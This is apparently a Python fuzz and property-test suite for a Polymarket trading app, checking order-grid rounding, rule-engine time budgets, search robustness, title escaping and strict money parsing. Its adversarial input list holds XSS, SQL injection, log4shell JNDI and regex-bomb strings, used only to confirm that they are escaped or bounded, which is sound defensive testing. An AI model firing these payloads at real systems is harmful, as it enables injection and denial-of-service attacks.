"""P13 D6 — property-based and fuzz tests.

The kit's list, and each item is one test class here:

  1. **Order construction**: arbitrary valid inputs always produce an order on the tick grid, at or above the
     minimum size, with the builder code present.
  2. **Rule engine**: arbitrary user-composed rules never consume unbounded CPU or memory.
  3. **Search**: adversarial input (huge strings, regex bombs, homoglyphs, RTL overrides, null bytes) never
     hangs or injects.
  4. **Market metadata**: adversarial titles and descriptions render safely. Anyone can create a Polymarket
     market, so this text is attacker-controlled and it renders in our UI.
  5. **Numeric parsing**: malformed prices and sizes are rejected, never coerced.

Two things about the method, because a fuzz suite is easy to write in a way that proves nothing:

* **The generator is seeded and the corpus is printed on failure.** A failing case that cannot be reproduced is
  a rumour, not a bug report, so every case is drawn from `random.Random(<fixed seed>)` and the assertion
  message carries the input.
* **Every property is paired with a "this can fail" control.** A budget test that passes because the workload
  never ran is the same as no test; each property asserts its work actually happened (counts, sizes) before it
  asserts the bound.
"""
from __future__ import annotations

import contextlib
import os
import random
import re
import time
import unicodedata
import unittest

from conftest import import_app, refresh_flags  # noqa: F401

MICRO = 10 ** 6

#: Ranges the properties draw from. Deliberately wider than the venue's own limits in places: a generator that
#: only produces in-range values tests the happy path with extra steps, and the fail-closed behaviour of the
#: parsers is part of what D6 asks to be checked.
PRICE_TICKS = (10 ** 3, 10 ** 4)          # 0.001 and 0.01 markets
SIDES = ("BUY", "SELL")

#: Adversarial strings, and where each one comes from. Every entry is either a real bypass technique or a real
#: upstream accident (a market title with a bidi override is not hypothetical — anyone can publish one).
NASTY = [
    "<script>alert(1)</script>",
    "<b>bold</b> & <i>italic</i>",
    "javascript:alert(1)",
    "𝕳𝖊𝖑𝖑𝖔 — homoglyphs",
    "‮gnipord ‬",                                   # RTL override
    "\u200b\u200c\u200dzero width",
    "line\nbreak\r\nand\ttab",
    "null\x00byte",
    "a" * 100_000,
    "(" * 1_000 + "a" + ")" * 1_000,                        # regex bomb shape
    "(?:a+)+$" + "b" * 50,
    "\\x00\\u0000",
    "🎯" * 500,
    "'; DROP TABLE markets; --",
    "${jndi:ldap://x/a}",                                  # log4shell shape, because logs are an output too
]


def rnd_price(rng: random.Random, tick: int, *, on_grid: bool = True) -> int:
    """A price in micro-USDC. On the grid means a multiple of the tick, which is what the venue accepts."""
    ticks = rng.randrange(1, MICRO // tick)
    p = ticks * tick
    if not on_grid:
        p += rng.randrange(1, tick)
    return min(max(p, 1), MICRO - 1)


class TestOrderConstruction(unittest.TestCase):
    """Property 1. `build_signed_payload` is the last place a number is ours before the venue sees it."""

    def setUp(self):
        self.rng = random.Random(13_0601)

    def intent(self, *, price_micro: int, size_micro: int, tick: str, side: str, builder: str):
        from polygm_core.executor.executor import OrderIntent
        return OrderIntent(id="i-%d" % self.rng.randrange(10 ** 9), user_id="u-props", token_id="token-1",
                           side=side, price_micro=price_micro, size_shares_micro=size_micro,
                           idempotency_key="k-%d" % self.rng.randrange(10 ** 9), condition_id="0xcond",
                           tick_size=tick, builder_code=builder)

    def test_arbitrary_valid_orders_stay_on_the_grid_and_keep_their_builder_code(self):
        from polygm_core.executor.executor import build_signed_payload
        from polygm_core.money.cents import to_float_for_sdk

        cases = 2_000
        checked = 0
        for _ in range(cases):
            tick_micro = self.rng.choice(PRICE_TICKS)
            price = rnd_price(self.rng, tick_micro)
            size = self.rng.randrange(5 * MICRO, 500_000 * MICRO)         # >= the venue's 5-share minimum
            builder = "0x" + "".join(self.rng.choice("0123456789abcdef") for _ in range(8))
            i = self.intent(price_micro=price, size_micro=size, tick=str(tick_micro / MICRO), side=self.rng.choice(SIDES),
                            builder=builder)
            payload = build_signed_payload(i)
            # the grid: the float the SDK will send must convert back to the micro integer we hold exactly
            self.assertEqual(round(payload["price"] * MICRO), price,
                             "price left the tick grid: %r from %d micro" % (payload["price"], price))
            self.assertEqual(round(payload["size"] * MICRO), size, "size lost precision on the way to the SDK")
            self.assertEqual(payload["price"], to_float_for_sdk(price, field="price"))
            self.assertEqual(payload["builder"], builder, "the builder code must be carried verbatim")
            self.assertGreaterEqual(payload["size"], 5.0, "an order under the venue minimum was built")
            self.assertEqual(payload["side"], i.side)
            checked += 1
        self.assertEqual(checked, cases, "the generator must have produced every case it promised")

    def test_values_that_cannot_cross_the_float_boundary_are_refused_not_rounded(self):
        """The SDK takes floats; the money path takes integers. The property is the round-trip, not a range.

        `to_float_for_sdk` is the single boundary, and it refuses a value that cannot come back identical rather
        than shipping an order whose size differs by a micro-share.

        The boundary was MEASURED while writing this test, and the measurement corrected the code's own
        comment. `parse_usdc` bounds a value at `MAX_SAFE_INT` (2**53), and the P04 comment claimed
        `float(m)/1e6` round-trips for every m below that; it does not — a binary search puts the largest
        round-tripping micro value at 8,703,815,948,975,240 ($8.7 billion), and above it `repr` loses the last
        micro. Nothing we can place is anywhere near that ceiling (the per-order cap is four figures), so this
        test draws from the range orders actually live in and asserts the refusal at the top of the range.
        """
        from polygm_core.money.cents import MoneyError, to_float_for_sdk

        boundary = 8_703_815_948_975_240                     # measured by search, see the docstring
        refused, accepted = 0, 0
        for bad in (boundary + 1, 2 ** 53 - 1, 2 ** 53 - 3, 2 ** 53 + 1):
            with self.assertRaises(MoneyError, msg="%d crossed the float boundary unnoticed" % bad):
                to_float_for_sdk(bad, field="size")
            refused += 1
        self.assertEqual(to_float_for_sdk(boundary, field="size"), float(boundary) / MICRO)
        for _ in range(20_000):
            micro = self.rng.randrange(1, 10 ** 12)          # <= $1,000,000: orders live far below the ceiling
            f = to_float_for_sdk(micro, field="size")
            self.assertEqual(round(f * MICRO), micro, "the SDK float did not round-trip for %d" % micro)
            accepted += 1
        self.assertEqual((refused, accepted), (4, 20_000))

    def test_a_price_that_is_not_a_decimal_of_the_right_scale_is_refused(self):
        from polygm_core.money.cents import MoneyError, price_ticks

        for bad in ("0", "1", "-0.1", "0.0000001", "abc", "", "nan", "inf"):
            with self.assertRaises(MoneyError, msg="price %r was accepted" % bad):
                price_ticks(bad)
        for good, micro in (("0.001", 1_000), ("0.01", 10_000), ("0.5", 500_000), ("1e-3", 1_000)):
            self.assertEqual(price_ticks(good), micro)


class TestRuleEngineBudget(unittest.TestCase):
    """Property 2. User-composed rules are the other attacker-controlled program in the system."""

    def setUp(self):
        self.rng = random.Random(13_0602)

    def test_arbitrary_rules_and_events_stay_inside_the_evaluation_budget(self):
        from polygm_core.signals.engine import Engine, build_rule, RuleError

        engine = Engine()
        kinds = ("large_fill", "volume_spike", "rapid_move", "price_level", "spread_widen", "watched_wallet")
        rules, refusals = [], 0
        for n in range(200):
            kind = self.rng.choice(kinds)
            params = {}
            if kind == "large_fill":
                params = {"abs_usd_micro": self.rng.randrange(1, 10 ** 12), "min_sample": self.rng.randrange(2, 500)}
            elif kind == "volume_spike":
                params = {"window_min": self.rng.randrange(1, 10_000), "z": self.rng.uniform(0.1, 1e6),
                          "min_sample": self.rng.randrange(2, 100)}
            elif kind == "rapid_move":
                params = {"pct": self.rng.uniform(0.01, 1e6), "depth_floor_usd_micro": self.rng.randrange(1, 10 ** 12)}
            elif kind == "price_level":
                params = {"price_micro": self.rng.randrange(1, MICRO), "op": self.rng.choice([">=", "<="])}
            elif kind == "spread_widen":
                params = {"spread_bp": self.rng.randrange(1, 10_000)}
            else:
                params = {"min_usd_micro": self.rng.randrange(1, 10 ** 12)}
            try:
                rules.append(build_rule("r%d" % n, kind, params, owner="u%d" % (n % 7),
                                        channels=("push", "telegram" if n % 3 else "email")))
            except RuleError:
                refusals += 1
        self.assertGreater(len(rules), 100, "the property needs a real rule set, not two rules")

        worst_ms = 0.0
        fired = 0
        for n in range(20_000):
            event = {"type": self.rng.choice(["fill", "volume_bucket", "price_change", "market_clock", "settled"]),
                     "market": self.rng.choice(["0xM1", "0xM2", much := "0x" + "f" * 300]),
                     "token_id": "t1", "side": self.rng.choice(SIDES),
                     "usd_notional_micro": self.rng.randrange(0, 10 ** 13),
                     "market_median_fill_micro": self.rng.randrange(0, 10 ** 9),
                     "market_fill_sample": self.rng.randrange(0, 10_000),
                     "price_micro": self.rng.randrange(0, MICRO),
                     "imbalance": self.rng.uniform(-1, 1),
                     "bucket_ms": self.rng.randrange(0, 10 ** 13),
                     "title": self.rng.choice(NASTY)}
            t0 = time.perf_counter()
            out = engine.evaluate(rules, event, now_ms=1_800_000_000_000 + n * 1_000)
            worst_ms = max(worst_ms, (time.perf_counter() - t0) * 1000)
            fired += len(out)
            if engine.prune and len(engine.state) > engine.PRUNE_AT:
                engine.prune(1_800_000_000_000 + n * 1_000, rules)
        self.assertGreater(fired, 0, "no rule ever fired, so the budget was measured on an idle engine")
        self.assertLess(worst_ms, 50.0, "one evaluation took %.1f ms with %d rules" % (worst_ms, len(rules)))
        # memory: the cooldown memory is the only structure here that can grow, and it is pruned by its own rule
        engine.prune(1_800_000_000_000 + 20_000 * 1_000, rules)
        self.assertLess(len(engine.state), 20_000, "cooldown memory is not bounded by its own sweep")

    def test_adversarial_events_do_not_raise_and_do_not_inject(self):
        from polygm_core.signals.engine import Engine, build_rule

        engine = Engine()
        rules = [build_rule("r-wallet", "watched_wallet", {"min_usd_micro": 1}, owner="u1"),
                 build_rule("r-level", "price_level", {"price_micro": 500_000, "op": ">="}, owner="u1")]
        for text in NASTY:
            event = {"type": "fill", "market": text, "token_id": text, "side": text, "title": text,
                     "usd_notional_micro": 10 ** 9, "wallet": text, "market_fill_sample": 100,
                     "market_median_fill_micro": 1}
            t0 = time.perf_counter()
            engine.evaluate(rules, event, now_ms=1_800_000_000_000)
            self.assertLess((time.perf_counter() - t0) * 1000, 50, "evaluate hung on %r" % text[:24])

    def test_the_fanout_scheduler_holds_its_budget_at_a_hundred_thousand_rows(self):
        """The other half of "unbounded CPU": one evaluation with a large subscriber list."""
        from polygm_core.signals import fanout

        rows = [{"id": i, "signal_id": "s%d" % i, "user_id": "u%06d" % i, "channel": "push", "priority": 10,
                 "status": "queued", "queued_ms": 1_800_000_000_000, "attempts": 0} for i in range(100_000)]
        t0 = time.perf_counter()
        plan = fanout.plan(rows, now_ms=1_800_000_000_000, workers=16)
        ms = (time.perf_counter() - t0) * 1000
        self.assertLess(ms, 4_000, "planning 100k deliveries took %.0f ms" % ms)
        self.assertLessEqual(len(plan["claims"]), 16, "the worker cap is what keeps one evaluation from becoming "
                                                     "100k sends in a cycle")
        self.assertEqual(plan["queued_total"], 100_000)


class TestSearchAdversarial(unittest.TestCase):
    """Property 3. Search is where an attacker's string meets our CPU."""

    def setUp(self):
        from polygm_core.telegrambot import nl
        self.nl = nl
        self.index = tuple({"slug": "market-%d" % i, "question": "Will team %d win the cup in 2026?" % i}
                           for i in range(200))
        self.index += ({"slug": "evil", "question": "Will <b>anything</b> match a\u202ebidi\u200b title?"},)

    def test_adversarial_queries_never_hang_never_raise_and_never_inject(self):
        worked = 0
        for q in NASTY:
            t0 = time.perf_counter()
            hits = self.nl.resolve_market(q, self.index)
            ms = (time.perf_counter() - t0) * 1000
            self.assertLess(ms, 1_000, "resolve_market took %.0f ms on %r" % (ms, q[:24]))
            self.assertIsInstance(hits, list)
            for h in hits:
                self.assertIn("slug", h)
            worked += 1
        self.assertEqual(worked, len(NASTY))

    def test_a_regex_bomb_is_a_string_not_a_program(self):
        for q in ["(" * 5_000 + ")" * 5_000, "(a+)+$" * 200, ".*.*.*.*.*.*.*.*x"]:
            t0 = time.perf_counter()
            self.nl.resolve_market(q, self.index)
            self.assertLess((time.perf_counter() - t0) * 1000, 500, "a regex-shaped query was evaluated as one")

    def test_a_huge_query_is_bounded_before_it_reaches_the_matcher(self):
        from polygm_core.telegrambot import render
        q = "x" * 500_000
        t0 = time.perf_counter()
        out = self.nl.parse(q, markets=self.index)
        self.assertLess((time.perf_counter() - t0) * 1000, 2_000, "a 500 kB message took too long to classify")
        rendered = render.esc(q[:60])
        self.assertLessEqual(len(rendered), 1_000)


class TestMarketTextIsAttackerControlled(unittest.TestCase):
    """Property 4. Anyone can create a Polymarket market; its title renders in our UI and our messages."""

    def setUp(self):
        self.app = import_app("api-p13-text")
        refresh_flags(self.app)
        from fastapi.testclient import TestClient
        self.client = TestClient(self.app.app, raise_server_exceptions=False)

    def test_every_nasty_title_is_escaped_in_the_telegram_card(self):
        import html
        from polygm_core.telegrambot import render

        for text in NASTY:
            out = render.esc(text)
            self.assertNotIn("<script", out.lower(), "an unescaped script tag survived render.esc")
            self.assertNotIn("<b>", out.replace("&lt;b&gt;", ""), "tags leaked through the escaper")
            self.assertNotIn("\x00", out, "a null byte survived into a message")
            self.assertNotIn("\u202b", out, "a bidi override survived into a message")
            self.assertTrue(out == html.escape(out, quote=False) or "&" in out or out == text[:len(out)],
                            "render.esc changed the text without escaping it: %r" % out[:40])
            # the invisible-character sweep is the P07 sanitiser, and it is what stops a title rendering as
            # something other than itself
            stripped = unicodedata.normalize("NFC", out)
            self.assertNotIn("\u200b", stripped)
            self.assertNotIn("\u202e", stripped)

    def test_a_market_with_an_attacker_title_is_served_without_executable_markup(self):
        r = self.client.get("/v1/markets/0xM1")
        self.assertEqual(r.status_code, 200, r.text[:200])
        body = r.text
        for needle in ("<script", "javascript:", "\x00"):
            self.assertNotIn(needle, body, "the market payload carried %r to a client" % needle)
        # and the payload is JSON at all — a title that broke the encoder would surface here
        self.assertIsInstance(r.json(), dict)


class TestNumericParsingIsStrict(unittest.TestCase):
    """Property 5. Malformed prices and sizes are rejected, never coerced."""

    MALFORMED = ["", " ", "1.2.3", "nan", "NaN", "inf", "-inf", "1e6", "0x10", "1,000", "１", "١٢",
                 "1 2", "0.51 USDC", "..", "+1", "1.", ".5.5", "\x00", "None", "null", "true", "１２．５",
                 "0.0000001", "-0.5", "1e-9", "999999999999999999999999", "0.5\n", "\u00a05", "1/2"]

    def test_parse_usdc_refuses_everything_that_is_not_an_exact_decimal(self):
        from polygm_core.money.cents import MoneyError, parse_usdc

        accepted = []
        for bad in self.MALFORMED:
            try:
                got = parse_usdc(bad)
                accepted.append((bad, got))
            except MoneyError:
                continue
        self.assertEqual(accepted, [], "these were coerced instead of refused: %s" % accepted)

    def test_floats_are_refused_by_type_in_the_money_path(self):
        from polygm_core.money.cents import MoneyError, parse_usdc
        for v in (0.5, 1.0, 12.345, 1e-7, float("nan")):
            with self.assertRaises(MoneyError, msg="float %r was accepted as money" % v):
                parse_usdc(v)
        for v in (True, False):
            with self.assertRaises(MoneyError, msg="bool %r was accepted as money" % v):
                parse_usdc(v)

    def test_round_tripping_the_money_path_never_loses_precision(self):
        """D2's "no float anywhere", as a property: the decimal type is `int` micro-units, and it is proved.

        The money path is integer-only end to end (`parse_usdc` -> `int` micro -> `fmt_usdc`); the single float
        conversion is confined to `to_float_for_sdk`, which is asserted to round-trip inside the exact range.
        So this property draws 20,000 decimals the venue could quote, pushes each through the whole path, and
        requires the exact value back — including the 10-decimal values the venue's own pipeline emits.
        """
        from decimal import Decimal
        from polygm_core.money.cents import fmt_usdc, parse_usdc, to_float_for_sdk

        rng = random.Random(13_0603)
        kept = 0
        for _ in range(20_000):
            whole = rng.randrange(0, 10_000)
            frac = rng.randrange(0, 10 ** 6)
            text = "%d.%06d" % (whole, frac)
            micro = parse_usdc(text)
            self.assertEqual(micro, whole * 10 ** 6 + frac)
            self.assertEqual(fmt_usdc(micro).replace(",", ""), str(Decimal(text).normalize()).rstrip("0").rstrip(".")
                             if micro % 10 ** 6 else str(whole))
            self.assertEqual(round(to_float_for_sdk(micro, field="amount") * 10 ** 6), micro,
                             "the SDK float did not round-trip for %s" % text)
            kept += 1
        self.assertEqual(kept, 20_000)

        # the venue's own float-y fills: 0.1699999983 is 0.17 with its pipeline's noise, and the tape path
        # rounds to micro rather than refusing a real fill (measured: 49 of 200 recorded rows)
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                        "services", "ingest"))
        import normalise as N
        self.assertEqual(N.fill_micro("0.1699999983", field="price"), 170_000)
        self.assertEqual(N.fill_micro("0.17", field="price"), 170_000)


if __name__ == "__main__":
    unittest.main(verbosity=2)
